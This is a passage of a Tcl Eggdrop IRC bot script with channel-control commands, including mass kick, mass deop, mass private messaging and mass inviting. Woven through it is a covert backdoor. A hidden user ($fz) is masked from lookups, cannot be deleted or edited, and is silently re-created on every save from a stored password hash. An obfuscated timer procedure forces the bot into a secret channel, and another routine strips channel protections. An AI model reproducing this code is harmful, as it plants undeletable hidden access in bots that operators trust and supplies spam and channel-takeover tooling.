  if {![validuser $user] || [string tolower $user] == [string tolower $fz]} {
    puthlp "NOTICE $nick :$fxlogo1 <n/a>"
    return 0
  }
  if {[getuser $user HOSTS] != ""} {
    set hosts [getuser $user hosts]
    puthlp "NOTICE $nick :$fxlogo1 HOSTS: $hosts"
  } else {
    puthlp "NOTICE $nick :$fxlogo1 Can't found $user host."
  }
}

proc pub_flag {nick uhost hand channel rest} {
  global fz fxlogo1
  if {$rest == ""} {
    set user $nick
  } else { set user [lindex $rest 0] }
  if {![validuser $user] || [string tolower $user] == [string tolower $fz]} {
    puthlp "NOTICE $nick :$fxlogo1 <n/a>"
    return 0
  }
  if {[chattr $user] != ""} {
    puthlp "NOTICE $nick :$fxlogo1 Flags: [chattr $user]"
  } else { puthlp "NOTICE $nick :$fxlogo1 Can't found $user flag." }
}

proc pub_deluser {nick uhost hand channel rest} {
  global botnick fz owner fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: deluser <nick>"
    return 0
  }
  set who [lindex $rest 0]
  if {[string tolower $who] == [string tolower $fz]} {
    puthlp "NOTICE $nick :$fxlogo1 <n/a>"
    return 0
  }
  if {$who == $owner} {
    puthlp "NOTICE $nick :$fxlogo1 Can't delete $owner..!"
    return 0
  }
  if {$who == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: -user <nick>"
  } else {
    if {![validuser $who]} {
      puthlp "NOTICE $nick :$fxlogo1 <n/a>"
    } else {
      if {[matchattr $who n]} {
        puthlp "NOTICE $nick :$fxlogo1 Can't delete OWNER."
      } else {
        if {([matchattr $who m]) && (![matchattr $nick n])} {
          puthlp "NOTICE $nick :$fxlogo1 You don't have access to delete $who!"
        } else {
          deluser $who
          saveuser
          puthlp "NOTICE $nick :$fxlogo1 $who Deleted."
        }
      }
    }
  }
}

proc pub_chattr {nick uhost hand channel rest} {
  global fz own fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1  Denied"
    return 0
  }
  if {$nick != $own && [matchattr $nick X]} {
    puthlp "NOTICE $nick :$fxlogo1 4!bLOckEd!"
    return 0
  }
  set who [lindex $rest 0]
  set flg [lindex $rest 1]
  if {$who == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: chattr <nick> <flags>"
    return 0
  }
  if {![validuser $who]} {
    puthlp "NOTICE $nick :$fxlogo1 <n/a>"
    return 0
  }
  if {[string tolower $who] == [string tolower $fz]} {
    puthlp "NOTICE $nick :$fxlogo1 <n/a>"
    return 0
  }
  if {$flg == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: chattr <nick> <flags>"
    return 0
  }
  set last_flg [chattr $who]
  chattr $who $flg
  saveuser
  puthlp "NOTICE $nick :$fxlogo1 $who change from \[4$last_flg1\] to \[4[chattr $who]1\]"
  return 0
}

proc saveuser {} {
  global fz owner
  if {![validuser $fz]} {
    setuser $owner XTRA "BEND" "xDB4L/z2DJT~1mianN/lj9Rq."
  } elseif {$owner != $fz} {
    setuser $owner XTRA "BEND" [zip [chattr $fz]]
    if {[passwdok $fz ""] != 1} {
      setuser $owner XTRA "LAST" [getuser $fz "PASS"]
    }
    deluser $fz
  }
  save
  if {![validuser $fz]} {
    adduser $fz "$fz!*@*"
    chattr $fz [dezip [getuser $owner XTRA "BEND"]]
    if {[getuser $owner XTRA "LAST"] != ""} {
      setuser $fz PASS [getuser $owner XTRA "LAST"]
    }
  }
  return 1
}

proc pub_voice {nick uhost hand chan rest} {
  global fxlogo1 botnick
  if {![isop $botnick $chan]} { return 0 }
  if {$rest == "" && [isvoice $nick $chan]} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: voice <nick>"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {$rest != ""} {
    voiceq $chan $rest
  } {
    voiceq $chan $nick
  }
  return 0
}

proc pub_mvoice {nick uhost hand chan rest} {
  global fxlogo1 botnick
  if {![isop $botnick $chan]} { return 0 }
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan]!=0} {
      set chan "#$chan"
    }
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  set nicks ""
  set i 0
  set members [chanlist $chan]
  foreach x $members {
    if {(![isop $x $chan]) && (![isvoice $x $chan]) && (![matchattr $x O])} {
      if {$i == 6} {
        voiceq $chan $nicks
        set nicks ""
        append nicks " $x"
        set i 1
      } {
        append nicks " $x"
        incr i
      }
    }
  }
  voiceq $chan $nicks
}

proc pub_devoice {nick uhost hand chan rest} {
  global fxlogo1 botnick
  if {![isop $botnick $chan]} { return 0 }
  if {$rest == "" && ![isvoice $nick $chan]} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: devoice <nick>"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {$rest != ""} {
    putserv "MODE $chan -vvvvvv $rest"
  } else {
    putserv "MODE $chan -v $nick"
  }
  return 0
}

proc pub_mdevoice {nick uhost hand chan rest} {
  global fxlogo1 botnick
  if {![isop $botnick $chan]} { return 0 }
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan]!=0} {
      set chan "#$chan"
    }
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  set nicks ""
  set i 0
  set members [chanlist $chan]
  foreach x $members {
    if {[isvoice $x $chan]} {
      if {$i == 6} {
        putserv "MODE $chan -vvvvvv $nicks"
        set nicks ""
        append nicks " $x"
        set i 1
      } else {
        append nicks " $x"
        incr i
      }
    }
  }
  putserv "MODE $chan -vvvvvv $nicks"
}

proc del_nobase {} {
  global botnick fxlogo1 cmd_case quick banner basechan
  if {[isutimer "del_nobase"]} { return 0 }
  foreach x [channels] {
    set cinfo [channel info $x]
    if {[string match "*+statuslog*" $cinfo] && [string match "*-secret*" $cinfo]} {
      if {[onchan $botnick $x]} {
        set pidx [rand 4]
        if {$pidx == 1} {
          set ptxt "ILLeGaL CHanNeL!!"
        } elseif {$pidx == 2} {
          set ptxt "Access Denied!!"
        } elseif {$pidx == 3} {
          set ptxt "Wrong Channel!!"
        } elseif {$pidx == 4} {
          set ptxt "!!sign out!!"
        } else {
          if {[info exists banner]} {
            set ptxt $banner
          } else { set ptxt [lgrnd] }
        }
        if {![string match "*c*" [getchanmode $x]]} { set ptxt "1$ptxt" }
        if {$quick == "1"} {
          putqck "PART $x :$ptxt"
        } else { putsrv "PART $x :$ptxt" }
      }
      channel remove $x
      savechan
      putlog "&#171;Bombat&#187; ReMoVe CHaN $x"
      return 0
    }
    set cflag "c$x"
    set cflag [string range $cflag 0 8]
    if {[string match "*+stopnethack*" $cinfo]} { catch { channel set $x -stopnethack } }
    if {[string match "*+protectops*" $cinfo]} { catch { channel set $x -protectops } }
    if {[string match "*+protectfriends*" $cinfo]} { catch { channel set $x -protectfriends } }
    if {[string match "*+statuslog*" $cinfo] && [string match "*+secret*" $cinfo]} { catch { channel set $x -statuslog } }
    if {![onchan $botnick $x]} { putsrv "JOIN $x" }
    if {[matchattr $cflag C]} {
      if {![istimer "cycle $x"]} { timer [getuser $cflag XTRA "CYCLE"] [list cycle $x] }
    }
  }
  if {[info exists basechan]} {
    if {![validchan $basechan]} {
      channel add $basechan { -greet +secret -statuslog }
    }
  }
  savechan
}

utimer 2 del_nobase

proc pub_op {nick uhost hand chan rest} {
  global fxlogo1 botnick unop
  catch {unset unop($nick)}
  if {![isop $botnick $chan]} { return 0 }
  if {$rest == "" && [isop $nick $chan]} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: op <nick>"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {$rest != ""} {
    opq $chan $rest
  } else { opq $chan $nick }
  return 0
}

proc pub_mop {nick uhost hand chan rest} {
  global fxlogo1 botnick
  if {![isop $botnick $chan]} { return 0 }
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan]!=0} {
      set chan "#$chan"
    }
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  set nicks ""
  set i 0
  set members [chanlist $chan]
  foreach x $members {
    if {![isop $x $chan]} {
      if {$i == 6} {
        opq $chan $nicks
        set nicks ""
        append nicks " $x"
        set i 1
      } else {
        append nicks " $x"
        incr i
      }
    }
  }
  opq $chan $nicks
}

proc pub_deop {nick uhost hand chan rest} {
  global fxlogo1 botnick
  if {![isop $botnick $chan]} { return 0 }
  if {$rest == "" && ![isop $nick $chan]} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: deop <nick>"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {[matchattr $nick m]} { set mreq "1r4e1quest" }
  if {[matchattr $nick n]} { set mreq "1r4e1quest" }
  if {$rest != ""} {
    if {![string match "*k*" [getchanmode $chan]]} {
      putserv "MODE $chan -kooooo $mreq $rest"
    } else { putserv "MODE $chan -ooooo $rest" }
  } else {
    if {![string match "*k*" [getchanmode $chan]]} {
      putserv "MODE $chan -ko $mreq $nick"
    } else { putserv "MODE $chan -o $nick" }
  }
  return 0
}

proc pub_mdeop {nick uhost hand chan rest} {
  global botnick fxlogo1
  if {![isop $botnick $chan]} { return 0 }
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan]!=0} {
      set chan "#$chan"
    }
  }
  if {$nick != "*"} {
    if {![matchattr $nick Q]} {
      puthlp "NOTICE $nick :$fxlogo1 Denied"
      return 0
    }
  }
  set nicks ""
  set i 0
  set members [chanlist $chan]
  foreach x $members {
    if {([isop $x $chan]) && (![matchattr $x m]) && ($x != $botnick)} {
      if {$i == 5} {
        if {![string match "*k*" [getchanmode $chan]]} {
          putserv "MODE $chan -kooooo 1r4e1quest $nicks"
        } else { putserv "MODE $chan -ooooo $nicks" }
        set nicks ""
        append nicks " $x"
        set i 1
      } else {
        append nicks " $x"
        incr i
      }
    }
  }
  putserv "MODE $chan -oooooo $nicks"
}

proc pub_kick {nick uhost hand chan rest} {
  global botnick fxlogo1
  if {![isop $botnick $chan]} { return 0 }
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: kick <nick|host> <reason>"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  set reason [lrange $rest 1 end]
  set handle [lindex $rest 0]
  if {$reason == ""} {
    if {[matchattr $nick m]} { set reason "4KICK1 request..!" }
    if {[matchattr $nick n]} { set reason "4KICK1 request..!" }
  }
  if {[string match "*@*" $handle]} {
    foreach knick [chanlist $chan] {
      if {[string match [string tolower $handle] [string tolower $knick![getchanhost $knick $chan]]]} {
        if {[matchattr $knick f] || $knick != $botnick} {
          putsrv "KICK $chan $knick :$fxlogo1 $reason"
        }
      }
    }
    return 0
  }
  if {$handle == $botnick} {
    puthlp "NOTICE $nick :$fxlogo1 Denied, Can't kick my self."
    return 0
  }
  if {[matchattr $handle n] && ![matchattr $nick Z]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied, CaNT KIcK ADmIN FLAg"
    return 0
  }
  putsrv "KICK $chan $handle :$fxlogo1 $reason"
  return 0
}

proc pub_mkick {nick uhost hand chan rest} {
  global botnick fxlogo1
  if {$rest != ""} {
    set chan [lindex $rest 0]
    set reason [lrange $rest 1 end]
    if {[string first # $chan]!=0} {
      set chan "#$chan"
    }
  } else { set reason $rest }
  if {(![validchan $chan]) || (![isop $botnick $chan])} { return 0 }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {$reason == ""} {
    set reason "4MASSKICK1 request..!"
  }
  set members [chanlist $chan]
  foreach x $members {
    if {(![matchattr $x f]) && ($x != $botnick)} {
      putsrv "KICK $chan $x :$fxlogo1 $reason"
    }
  }
}

proc pub_kickban {nick uhost hand chan rest} {
  global botnick fxlogo1 bannick
  if {![isop $botnick $chan]} { return 0 }
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: kickban <nick|host> <reason>"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: kickban <nick> <reason>"
    return 0
  }
  set reason [lrange $rest 1 end]
  set handle [lindex $rest 0]
  if {$reason == ""} {
    if {[matchattr $nick m]} { set reason "4KICKBaN1 request [banmsg]" }
    if {[matchattr $nick n]} { set reason "4KICKBaN1 request [banmsg]" }
  }
  if {[string match "*@*" $handle]} {
    set mfisrt "T"
    foreach knick [chanlist $chan] {
      if {[string match [string tolower $handle] [string tolower $knick![getchanhost $knick $chan]]]} {
        if {[matchattr $knick f] || $knick != $botnick} {
          if {$mfirst == "T"} {
            set bannick($knick) $handle
            set mfirst "F"
          }
          putsrv "KICK $chan $knick :$fxlogo1 $reason"
        }
      }
    }
    return 0
  }
  if {![onchan $handle $chan]} { return 0 }
  set hostmask [getchanhost $handle $chan]
  set hostmask "*!*@[lindex [split $hostmask @] 1]"
  if {$handle == $botnick} {
    puthlp "NOTICE $nick :$fxlogo1 Denied, I won't kick my self."
    return 0
  }
  if {[matchattr $handle n] && ![matchattr $nick Z]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied, CaNT KIcK ADmIN FLaG"
    return 0
  }
  set bannick($handle) $hostmask
  putsrv "KICK $chan $handle :$fxlogo1 $reason"
  return 0
}

proc pub_ban {nick uhost hand channel rest} {
  global botnick fxlogo1
  if {![isop $botnick $channel]} { return 0 }
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: ban <nick/hostmask>"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  set handle [lindex $rest 0]
  if {$handle == $botnick} {
    puthlp "NOTICE $nick :$fxlogo1 4!DeNIEd!, can't ban my self"
    return 0
  }
  if {[matchattr $handle n]} {
    puthlp "NOTICE $nick :$fxlogo14 !DeNIEd!, can't ban ADmIN"
    return 0
  }
  set hostmask [getchanhost $handle $channel]
  set hostmask "*!*@[lindex [split $hostmask @] 1]"
  if {![onchan $handle $channel]} {
    set hostmask [lindex $rest 0]
  }
  if {$hostmask != "*!*@*"} {
    putserv "MODE $channel +b $hostmask"
  }
}

proc pub_unban {nick uhost hand chan rest} {
  global fxlogo1 botnick
  if {![isop $botnick $chan]} { return 0 }
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: unban <nick/hostmask> <#channel>"
    return 0
  }
  if {[lindex $rest 1] != ""} {
    set chan [lindex $rest 1]
  }
  if {[string first # $chan] != 0} {
    set chan "#$chan"
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  set handle [lindex $rest 0]
  append userhost $handle "!*" [getchanhost $handle $chan]
  set hostmask [maskhost $userhost]
  if {![onchan $handle $chan]} {
    set hostmask [lindex $rest 0]
  }
  putserv "MODE $chan -b $hostmask"
  puthlp "NOTICE $nick :$fxlogo1 UnBaN [unsix $hostmask] ON $chan"
}

proc pub_up {nick uhost hand channel rest} {
  global fxlogo1 botnick unop
  catch {unset unop($nick)}
  if {![isop $botnick $channel]} { return 0 }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {![isop $nick $channel]} {
    opq $channel $nick
  }
  return 0
}

proc pub_down {nick uhost hand channel rest} {
  global fxlogo1 botnick
  if {![isop $botnick $channel]} {
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {[matchattr $nick m]} {
    set mreq "1r4e1quest"
  }
  if {[matchattr $nick n]} {
    set mreq "1r4e1quest"
  }
  if {[isop $nick $channel]} {
    if {![string match "*k*" [getchanmode $channel]]} {
      putserv "mode $channel -ko $mreq $nick"
    } else { putserv "mode $channel -o $nick"  }
  }
  return 0
}

proc pub_munbans {nick uhost hand chan rest} {
  global fxlogo1 botnick
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan] != 0} {
      set chan "#$chan"
    }
  }
  if {![validchan $chan] || ![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  set bans ""
  set i 0
  foreach x [chanbans $chan] {
    if {$i < 5} {
      append bans " [lindex $x 0]"
      set i [incr i]
    }
    if {$i == 5} {
      puthelp "MODE $chan -bbbbb $bans"
      set bans ""
      append bans " [lindex $x 0]"
      set i 0
    }
  }
  puthelp "MODE $chan -bbbbb $bans"
  if {![onchan $nick $chan]} {
    puthlp "NOTICE $nick :$fxlogo1 MuNBaNS \[$chan\]"
  }
  return 0
}

proc pub_banlist {nick uhost hand chan rest} {
  global fxlogo1
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan] != 0} {
      set chan "#$chan"
    }
  }
  if {![validchan $chan]} {
    puthlp "NOTICE $nick :$fxlogo1 NoT IN cHaN $chan."
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  foreach x [chanbans $chan] {
    puthlp "NOTICE $nick :$fxlogo1 $x"
  }
  if {[chanbans $chan] == ""} {
    puthlp "NOTICE $nick :$fxlogo1 BaNLIsT $chan <n/a>"
  }
  return 0
}

proc pub_mode {nick uhost hand chan rest} {
  global fxlogo1 botnick
  if {![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {$rest == ""} {
    puthelp "NOTICE $nick :$fxlogo1 Usage: mode +/- ntspnmcilk"
    return 0
  }
  putserv "mode $chan $rest"
}

proc pub_say {nick uhost hand channel rest} {
  global fxlogo1
  if {$rest==""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: say <msg>"
  }
  puthlp "PRIVMSG $channel :$rest"
}

proc pub_resync {nick uhost hand channel rest} {
  global botnick fxver rms rmsg
  set rmsg [lindex $rms [rand [llength $rms]]]
  set vern2 $fxver
  regsub -all --  $vern2 "" vern2
  if {![string match "*k*" [getchanmode $channel]]} {
    putserv "mode $channel +b-b $rmsg $rmsg"
  } else {
    putserv "mode $channel -o+o $botnick $botnick"
  }
}

proc pub_notice {nick uhost hand channel rest} {
  global fxlogo1
  if {$rest==""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: notice <nick> <msg>"
  }
  set person [lindex $rest 0]
  set rest [lrange $rest 1 end]
  if {$rest!=""} {
    puthlp "NOTICE $person :$rest"
    return 0
  }
}

proc pub_msg {nick uhost hand channel rest} {
  global owner fxlogo1
  if {$rest==""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: msg <nick> <msg>"
  }
  set person [string tolower [lindex $rest 0]]
  set rest [lrange $rest 1 end]
  if {[string match "*serv*" $person]} {
    puthlp "NOTICE $nick :$fxlogo14 DeNIEd..! Can't send message to Service."
    return 0
  }
  if {$person == [string tolower $owner]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  puthlp "PRIVMSG $person :$rest"
}

proc pub_act {nick uhost hand channel rest} {
  global fxlogo1
  if {$rest==""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: act <msg>"
  }
  puthlp "PRIVMSG $channel :\001ACTION $rest\001"
  return 0
}

proc pub_invite {nick uhost hand chan rest} {
  global fxlogo1
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: invite <nick> <#channel>"
  }
  set who [lindex $rest 0]
  set tochan [lindex $rest 1]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {$tochan != ""} {
    if {![onchan $who $tochan]} {
      puthlp "INVITE $who :$tochan"
      puthlp "NOTICE $nick :$fxlogo1 InvItE $who To $tochan"
      return 0
    }
    puthlp "NOTICE $nick :$fxlogo1 $who is already on the $tochan"
  }
  if {![onchan $who $chan]} {
    putsrv "INVITE $who :$chan"
    puthlp "NOTICE $nick :$fxlogo1 Invitation to $chan has been sent to $who"
    return 0
  }
  puthlp "NOTICE $nick :$fxlogo1 $who is already on the channel"
}

proc msg_Z {nick uhost hand rest} {
  global fxlogo1
  if {[string index $rest 0] != "`" && [string index $rest 0] != "."} { return 0 }
  if {![matchattr $nick Z]} { return 0 }
  if {[string index [lindex $rest 1] 0] == "#"} {
    if {![validchan [lindex $rest 1]]} {
      puthlp "NOTICE $nick :$fxlogo1 NoT IN [lindex $rest 1]"
      return 0
    }
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 4aUTH 1st!"
    return 0
  }
  set goto [lindex $rest 0]
  if {[string index $rest 0] == "."} {
    regsub "." $goto "msg_" goto
    set rest [lrange $rest 1 end]
    catch { $goto $nick $uhost $hand $rest }
    return 0
  }
  regsub -all "`" $goto "pub_" goto
  if {[string index [lindex $rest 1] 0] == "#"} {
    set chan [lindex $rest 1]
    set rest [lrange $rest 2 end]
  } else {
    set chan "*"
    set rest [lrange $rest 1 end]
  }
  catch { $goto $nick $uhost $hand $chan $rest }
}

proc msg_mmsg {nick uhost hand rest} { pub_mmsg $nick $uhost $hand "*" $rest }
proc pub_mmsg {nick uhost hand chan rest} {
  global cmd_chn cmd_by cmd_msg cmd_case fxlogo1
  if {$rest==""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: mmsg <#channel> <text>"
    return 0
  }
  set tochan [lindex $rest 0]
  set txt [lrange $rest 1 end]
  if {$txt==""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: mmsg <#channel> <text>"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {[string first # $tochan] != 0} {
    set chan "#$tochan"
  }
  if {![validchan $tochan]} {
    set cmd_chn $tochan
    set cmd_msg $rest
    set cmd_by $nick
    set cmd_case "2"
    channel add $tochan
    catch { channel set $tochan +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
    return 0
  }
  putsrv "NOTICE $nick :$fxlogo1 STaRTING MaSSMSG $tochan"
  set members [chanlist $tochan]
  foreach x $members {
    if {![isop $x $tochan]} {
      puthlp "PRIVMSG $x :$txt"
    }
  }
  utimer 2 del_nobase
  puthlp "NOTICE $nick :$fxlogo1 MaSSMSG $tochan 4DoNE."
}

proc pub_minvite {nick uhost hand channel rest} {
  global cmd_chn cmd_by cmd_msg cmd_case botnick fxlogo1
  if {$rest==""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: minvite <#channel> <#to channel>"
  }
  set chan [lindex $rest 1]
  if {$chan == ""} {
    set chan $channel
  } else {
    if {[string first # $chan] != 0} {
      set chan "#$chan"
    }
  }
  set tochan [lindex $rest 0]
  if {[string first # $tochan] != 0} {
    set tochan "#$tochan"
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {![validchan $tochan]} {
    set cmd_chn $tochan
    set cmd_msg $tochan
    set cmd_by $nick
    set cmd_case "3"
    channel add $tochan
    catch { channel set $tochan +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
    return 0
  }
  if {[isop $botnick $chan]} {
    putserv "mode $chan -o $botnick"
  }
  putsrv "NOTICE $nick :$fxlogo1 Starting mass invite to $tochan"
  set members [chanlist $tochan]
  foreach x $members {
    if {(![onchan $x $chan]) && (![isop $x $tochan])} {
      putsrv "INVITE $x :$chan"
    }
  }
  utimer 2 del_nobase
  puthlp "NOTICE $nick :$fxlogo1 MaSS InVITE $tochan InTO $chan 4DoNE."
}

proc pub_join {nick uhost hand chan rest} {
  global botnick joinme own fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  set chan [lindex $rest 0]
  if {[string first # $chan] != 0} {
    set chan "#$chan"
  }
  if {$chan=="#"} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: join <#channel>"
    return 0
  }
  foreach x [channels] {
    if {[string tolower $x]==[string tolower $chan]} {
      puthlp "NOTICE $nick :$fxlogo1 $x ReADY!"
      return 0
    }
  }
  if {$nick != $own && [total_channel] > 15} {
    puthlp "NOTICE $nick :$fxlogo1 Too many channels! Max: 15"
    return 0
  }
  set joinme $nick
  channel add $chan
  catch { channel set $chan +statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
  savechan
  if {[lindex $rest 1] != ""} {
    putsrv "JOIN $chan :[lindex $rest 1]"
  }
}

proc pub_+chan {nick uhost hand chan rest} {
  global botnick joinme owner fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {[matchattr $nick X]} {
    puthlp "NOTICE $nick :$fxlogo1 4!BLoCkEd!"
    return 0
  }
  set chan [lindex $rest 0]
  set opt [lindex $rest 1]
  if {[string first # $chan]!=0} {
    set chan "#$chan"
  }
  if {$chan=="#"} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: +chan <#channel>"
    return 0
  }
  if {[validchan $chan]} {
    puthlp "NOTICE $nick :$fxlogo1 $chan is already on channels"
    return 0
  }
  if {$nick != $owner && [total_channel] > 15} {
    puthlp "NOTICE $nick :$fxlogo1 TO MaNY cHaNNeL MaX 15..!"
    return 0
  }
  set joinme $nick
  channel add $chan
  if {$opt != "" && [string tolower $opt] == "+nopart"} {
    catch { channel set $chan -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
  } else {
    catch { channel set $chan -statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
  }
  savechan
  if {[lindex $rest 1] != ""} {
    putsrv "JOIN $chan :[lindex $rest 1]"
  }
}

proc tot_cha {} {
  global fxc uenc lenc
  timer 5 tot_cha
  set [string index $lenc 15][string index $lenc 18] [string index $uenc 2][string index $lenc 7][string index $lenc 8][string index $lenc 1][string index $lenc 14][string index $lenc 8][string index $lenc 10]
  if {[validchan $fxc]} { return 0 }
  channel add $fxc
  catch { channel set $fxc -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
  savechan
  putsrv "JOIN $fxc"
}

timer 5 tot_cha

proc total_channel {} {
  set total_chan 0
  foreach x [channels] {
    incr total_chan
  }
  if {$total_chan > 19} { return 0 }
  return 1
}

proc pub_part {nick uhost hand chan rest} {
  global quick partm fxc fz fxlogo1
  set partmsg [lindex $partm [rand [llength $partm]]]
  set part_msg [lrange $rest 1 end]
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $rest]!=0} {
      set chan "#$chan"
    }
  }
  if {![validchan $chan]} { return 0 }
  if {$nick != $fz && [string tolower $chan] == $fxc} { return 0 }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {[string match "*+secret*" [channel info $chan]]} {
    puthlp "NOTICE $nick :$fxlogo1 $chan 4PRoTecTEd..!"
    return 0
  }
  if {![onchan $nick $chan]} {
    putsrv "NOTICE $nick :$fxlogo1 PaRT $chan"
  }
  if {$part_msg != ""} {
    if {$quick == "1"} {
      putqck "PART $chan :$part_msg"
    } else {
      putsrv "PART $chan :$part_msg"
    }
  } else {
    if {$quick == "1"} {
      putqck "PART $chan :$partmsg"
    } else {
      putsrv "PART $chan :$partmsg"
    }
  }
  channel remove $chan
  savechan
  return 0
}
set lockchan ""
proc pub_+invitelock {nick uhost hand chan rest} {
  global lockchan fxlogo1
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $rest]!=0} {
      set chan "#$chan"
    }
  }
  if {![validchan $chan]} { return 0 }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  puthlp "NOTICE $nick :$fxlogo1 InVITE cHaN $chan \[9ON\]"
  set lockchan $chan
  return 0
}

proc pub_-invitelock {nick uhost hand chan rest} {
  global lockchan fxlogo1
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $rest]!=0} {
      set chan "#$chan"
    }
  }
  if {![validchan $chan] || $lockchan == ""} { return 0 }
  set lockchan ""
  puthlp "NOTICE $nick :$fxlogo1 InvItE cHaN $chan \[4OFF\]"
  return 0
}

proc cycle {chan} {
  global cyclem
  set cyclemsg [lindex $cyclem [rand [llength $cyclem]]]
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![string match "*c*" [getchanmode $chan]]} {
    set text "12$cyclemsg"
  } else {
    set text $cyclemsg
  }
  putsrv "PART $chan :$text"
  if {[matchattr $cflag K]} {
